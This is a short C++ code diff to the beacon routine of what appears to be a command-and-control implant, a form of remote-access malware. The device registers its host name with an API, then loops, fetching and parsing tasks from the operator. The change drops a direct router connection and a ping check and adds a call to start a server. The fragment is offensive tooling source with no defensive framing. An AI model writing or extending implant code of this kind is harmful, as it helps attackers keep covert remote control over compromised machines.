@@ -36,21 +36,12 @@ void Implant::beacon() {
     auto host = boost::asio::ip::host_name(); 
     api.register_device(id, host);
 
-    Router router = Router();
-    // router.server();
-    int socket = router.establish_connection();
-
-    router.client_send(socket, MessageFactory::create_get_tasks(ref(id)));
-
     /* Loop */
     while (true)
     {
-        /* Assert that we can communicate with the API */
-        if (!api.assert_ping_pong()) {
-            sleep(3);
-            continue;
-        }
-        
+        /* Try to start the server if not active */
+        api.start_server();
+
         /* Get all the tasks for this device */
         std::string response_task_to_do = api.get_tasks(id);
         parse_tasks_response(response_task_to_do);
